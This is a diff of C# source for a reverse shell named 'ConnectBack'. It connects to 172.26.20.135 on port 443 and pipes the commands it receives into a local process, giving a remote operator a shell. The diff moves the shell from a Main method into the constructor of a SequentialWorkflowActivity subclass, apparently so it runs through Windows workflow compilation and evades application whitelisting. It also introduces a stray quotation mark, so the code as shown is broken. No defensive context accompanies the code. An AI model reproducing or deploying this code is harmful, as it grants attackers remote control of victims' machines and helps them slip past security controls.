@@ -3,21 +3,17 @@ using System.Text;
 using System.IO;
 using System.Diagnostics;
 using System.ComponentModel;
-using System.Core;
-using System.Linq; 
 using System.Net;
 using System.Net.Sockets;
+using System.Workflow.Activities;
 
-
-namespace ConnectBack
-{
-	public class Program
+	public class Program : SequentialWorkflowActivity
 	{
 		static StreamWriter streamWriter;
 
-		public static void Main(string[] args)
+		public Program()
 		{
-			using(TcpClient client = new TcpClient("172.26.20.135", 443))
+			using(TcpClient client = new TcpClient(""172.26.20.135", 443))
 			{
 				using(Stream stream = client.GetStream())
 				{
@@ -41,7 +37,6 @@ namespace ConnectBack
 						while(true)
 						{
 							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
 							p.StandardInput.WriteLine(strInput);
 							strInput.Remove(0, strInput.Length);
 						}
@@ -66,5 +61,5 @@ namespace ConnectBack
             }
         }
 
-	}
-}
+	}	
+	
